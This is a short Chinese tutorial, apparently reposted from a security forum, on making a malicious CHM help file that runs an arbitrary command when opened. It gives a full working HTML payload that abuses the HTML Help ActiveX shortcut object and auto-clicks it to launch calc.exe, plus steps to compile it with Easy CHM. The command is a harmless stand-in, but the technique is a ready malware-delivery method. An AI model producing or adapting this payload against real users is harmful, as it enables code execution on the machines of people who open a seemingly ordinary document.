# 恶意chm文件生成

恶意chm文件生成，打开则执行任意命令。  

微软自己的`HTML Help Workshop`官方下载地址已经404了，所以下载安装`Easy chm`，随便搜一个下载，装到虚拟机里。  

准备test.html，放在一个文件夹里  
```html
<html>

<head>
    <title>test</title>
</head>

<body>
    <OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
        <PARAM name="Command" value="ShortCut">
        <PARAM name="Button" value="Bitmap::shortcut">
        <PARAM name="Item1" value=",calc.exe">
        <PARAM name="Item2" value="273,1,1">
    </OBJECT>

    <SCRIPT>
        x.Click();
    </SCRIPT>
</body>

</html>
```

运行Easy CHM，新建项目，打开准备好的文件夹，编译->生成CHM 即可  

打开新生成的chm文件，计算器就会被打开。  


原链接: https://bbs.pediy.com/thread-267038.htm  


2021/10/18  
